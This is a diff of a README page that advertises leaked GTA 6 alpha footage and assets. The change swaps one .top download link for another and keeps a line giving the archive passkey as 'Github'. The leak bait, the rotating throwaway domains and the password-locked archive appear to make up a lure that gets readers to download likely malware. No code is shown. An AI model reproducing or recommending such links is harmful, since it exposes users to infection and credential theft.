@@ -6,7 +6,7 @@ GTA 6 Alpha build footage and assets leaked by Cyberleak. Over 2 hours of playab
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
